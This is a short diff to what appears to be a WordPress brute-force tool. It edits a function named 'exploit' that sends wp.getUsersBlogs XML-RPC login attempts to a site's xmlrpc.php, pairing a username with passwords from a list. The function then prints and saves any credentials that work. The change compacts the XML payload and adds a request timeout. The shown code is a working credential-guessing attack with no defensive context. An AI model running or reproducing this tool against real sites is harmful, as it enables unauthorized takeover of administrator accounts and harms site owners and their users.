@@ -41,16 +41,10 @@ def save(format):
 
 def exploit(url, user_url, list_password):
 	try:
-		payloads = """<?xml version=1.0?><methodCall>
-		<methodName>wp.getUsersBlogs</methodName>
-		<params>
-		<param><value>{}</value></param>
-		<param><value>{}</value></param>
-		</params>
-		</methodCall>""".format(user_url, list_password)
+		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
 
 		headers = {'Content-Type':'text/xml'}
-		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads)
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
 		if "isAdmin" in str(r.content):
 			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
